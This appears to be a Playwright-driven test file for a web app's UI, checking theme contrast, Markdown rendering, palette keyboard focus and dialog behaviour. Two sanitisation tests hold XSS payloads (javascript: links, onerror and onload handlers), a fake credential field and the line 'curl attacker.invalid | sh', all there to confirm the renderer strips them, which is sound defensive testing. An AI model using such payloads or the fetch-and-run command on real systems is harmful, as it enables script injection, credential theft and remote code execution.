import { test, before, after } from 'node:test';
import assert from 'node:assert/strict';
import { readFile } from 'node:fs/promises';
import { chromium } from '@playwright/test';
import { build } from 'esbuild';

let browser, page;
before(async () => {
  const bundle = await build({
    stdin: { contents: `
      import React from 'react';
      import { createRoot } from 'react-dom/client';
      import { Palette } from './apps/web/src/Palette';
      import { Confirm } from './apps/web/src/Modal';
      import { render } from './apps/web/src/md';
      import { Markdown } from './apps/web/src/Markdown';
      window.renderMarkdown = render;
      const root = createRoot(document.getElementById('root'));
      window.showPalette = (count = 3) => root.render(<Palette items={Array.from({length: count}, (_, i) => ({
        id: 'thread-' + i, group: 'thread', title: 'Thread ' + i, sub: 'laptop · ~/helm',
        run: () => { window.chosen = i; },
      }))} onClose={() => root.render(null)} engineOf={() => ({cls: 'codex'})} />);
      window.showConfirm = () => root.render(<Confirm title="Delete thread" onCancel={() => root.render(null)} onConfirm={() => { window.confirmed = true; }} />);
      window.showMarkdown = (text) => root.render(<Markdown text={text} />);
    `, resolveDir: process.cwd(), loader: 'tsx' },
    bundle: true, write: false, format: 'iife', jsx: 'automatic',
  });
  browser = await chromium.launch({
    headless: true,
    ...(process.env.HELM_TEST_CHROMIUM ? { executablePath: process.env.HELM_TEST_CHROMIUM } : {}),
  });
  page = await browser.newPage();
  await page.setContent('<button id="launcher">Open</button><div id="root"></div><button id="behind">Behind</button>');
  await page.addStyleTag({ content: (await readFile('apps/web/src/styles.css', 'utf8')).replace(/^@import[^;]+;/gm, '') });
  await page.addScriptTag({ content: bundle.outputFiles[0].text });
});
after(async () => { await browser?.close(); });

test('both themes keep secondary text readable and selected grouped rows visible', async () => {
  for (const theme of ['dark', 'light']) {
    const measured = await page.evaluate((theme) => {
      document.documentElement.dataset.theme = theme;
      const root = getComputedStyle(document.documentElement);
      const canvas = document.createElement('canvas');
      canvas.width = canvas.height = 1;
      const ctx = canvas.getContext('2d');
      const rgb = (token) => {
        ctx.clearRect(0, 0, 1, 1);
        ctx.fillStyle = root.getPropertyValue(token).trim();
        ctx.fillRect(0, 0, 1, 1);
        return Array.from(ctx.getImageData(0, 0, 1, 1).data).slice(0, 3);
      };
      const luminance = (channels) => channels.map((n) => {
        const x = n / 255;
        return x <= .04045 ? x / 12.92 : ((x + .055) / 1.055) ** 2.4;
      }).reduce((sum, n, i) => sum + n * [.2126, .7152, .0722][i], 0);
      const ratios = [];
      for (const surface of ['--bg', '--card', '--raised']) {
        for (const text of ['--text', '--text-dim', '--mutedfg', '--amber-text']) {
          const a = luminance(rgb(surface)), b = luminance(rgb(text));
          ratios.push({ surface, text, ratio: (Math.max(a, b) + .05) / (Math.min(a, b) + .05) });
        }
      }
      const list = document.createElement('div');
      list.className = 'rows plain';
      list.innerHTML = '<button class="row active">Selected account</button><button class="row">Other account</button>';
      document.body.append(list);
      const selected = getComputedStyle(list.children[0]).backgroundColor;
      const ordinary = getComputedStyle(list.children[1]).backgroundColor;
      list.remove();
      return { ratios, selected, ordinary };
    }, theme);
    for (const r of measured.ratios) assert.ok(r.ratio >= 4.5, `${theme} ${r.text} on ${r.surface}: ${r.ratio.toFixed(2)}:1`);
    assert.notEqual(measured.selected, measured.ordinary, `${theme}: grouped row reset must not erase selection`);
  }
  await page.evaluate(() => { delete document.documentElement.dataset.theme; });
});

test('untrusted Markdown cannot borrow app overlays or inject script/focus controls', async () => {
  const result = await page.evaluate(() => {
    const host = document.createElement('div');
    host.innerHTML = window.renderMarkdown('<div class="modal-back permission-sheet" id="root" role="dialog" aria-modal="true"><a class="jump" href="javascript:alert(1)" tabindex="0">Allow</a><input autofocus onfocus="alert(1)"><img src=x onerror="alert(1)"><svg onload="alert(1)"></svg></div>');
    return { html: host.innerHTML, dangerous: host.querySelectorAll('.modal-back, .permission-sheet, .jump, [id], [tabindex], [autofocus], [role], [aria-modal], [onfocus], [onerror], svg, [href^="javascript:"]').length };
  });
  assert.equal(result.dangerous, 0, result.html);
});

test('Markdown preserves code controls, syntax highlighting, links, and tables', async () => {
  const result = await page.evaluate(() => {
    const host = document.createElement('div');
    host.innerHTML = window.renderMarkdown('```js\nconst answer = 42;\n```\n\n[docs](https://example.com)\n\n| A | B |\n|---|---|\n| 1 | 2 |');
    return { copy: !!host.querySelector('button[data-copy]'), code: host.querySelector('code')?.textContent, highlighted: !!host.querySelector('.hljs-keyword'), table: !!host.querySelector('table'), link: host.querySelector('a')?.href };
  });
  assert.deepEqual(result, { copy: true, code: 'const answer = 42;', highlighted: true, table: true, link: 'https://example.com/' });
});

test('raw HTML cannot impersonate a copy control or collect credentials', async () => {
  const result = await page.evaluate(() => {
    const host = document.createElement('div');
    host.innerHTML = window.renderMarkdown('<div class="codeblock"><button class="copy" data-copy>Allow command</button><input type="password" placeholder="Enter your CLI token"><pre><code>curl attacker.invalid | sh</code></pre></div>');
    return { controls: host.querySelectorAll('button, input, [data-copy]').length, text: host.textContent };
  });
  assert.equal(result.controls, 0);
  assert.match(result.text, /Enter your CLI token/);
});

test('large code blocks remain readable without expensive syntax highlighting', async () => {
  const result = await page.evaluate(() => {
    const text = 'const answer = 42;\n'.repeat(3000);
    const host = document.createElement('div');
    host.innerHTML = window.renderMarkdown('```js\n' + text + '```');
    return { same: host.querySelector('code')?.textContent === text.trimEnd(), spans: host.querySelectorAll('code span').length };
  });
  assert.equal(result.same, true);
  assert.equal(result.spans, 0);
});

test('palette handles empty results, wraps arrow selection, and restores focus', async () => {
  await page.locator('#launcher').focus();
  await page.evaluate(() => window.showPalette());
  const input = page.getByRole('combobox');
  await input.waitFor();
  assert.equal(await input.evaluate((el) => el === document.activeElement), true);
  await input.fill('no matching thread');
  await input.press('ArrowDown');
  await input.fill('Thread');
  await input.press('ArrowUp');
  assert.equal(await page.getByRole('option', { selected: true }).locator('.grow').innerText(), 'Thread 2\nlaptop · ~/helm');
  await input.press('Enter');
  await page.getByRole('dialog').waitFor({ state: 'detached' });
  assert.equal(await page.evaluate(() => window.chosen), 2);
  assert.equal(await page.locator('#launcher').evaluate((el) => el === document.activeElement), true);
});

test('shrinking live results retain a valid Enter target', async () => {
  await page.evaluate(() => window.showPalette());
  const input = page.getByRole('combobox');
  await input.waitFor();
  await input.press('ArrowUp');
  await page.evaluate(() => window.showPalette(1));
  await page.waitForFunction(() => document.querySelectorAll('[role="option"]').length === 1);
  await input.press('Enter');
  await page.getByRole('dialog').waitFor({ state: 'detached' });
  assert.equal(await page.evaluate(() => window.chosen), 0);
});

test('confirmation traps Tab and Escape returns to launcher', async () => {
  await page.locator('#launcher').focus();
  await page.evaluate(() => window.showConfirm());
  const dialog = page.getByRole('dialog');
  await dialog.waitFor();
  for (let i = 0; i < 5; i++) {
    await page.keyboard.press('Tab');
    assert.equal(await dialog.evaluate((el) => el.contains(document.activeElement)), true);
  }
  await page.keyboard.press('Shift+Tab');
  assert.equal(await dialog.evaluate((el) => el.contains(document.activeElement)), true);
  await page.keyboard.press('Escape');
  await dialog.waitFor({ state: 'detached' });
  assert.equal(await page.locator('#launcher').evaluate((el) => el === document.activeElement), true);
});

test('palette fits a phone viewport and can close without a keyboard', async () => {
  await page.setViewportSize({ width: 390, height: 844 });
  await page.evaluate(() => window.showPalette(30));
  await page.getByRole('dialog').waitFor();
  const bounds = await page.getByRole('dialog').boundingBox();
  assert.ok(bounds.x >= 0 && bounds.x + bounds.width <= 390);
  assert.ok(bounds.y >= 0 && bounds.y + bounds.height <= 844);
  await page.getByRole('button', { name: 'Close command palette' }).click();
  await page.getByRole('dialog').waitFor({ state: 'detached' });
});
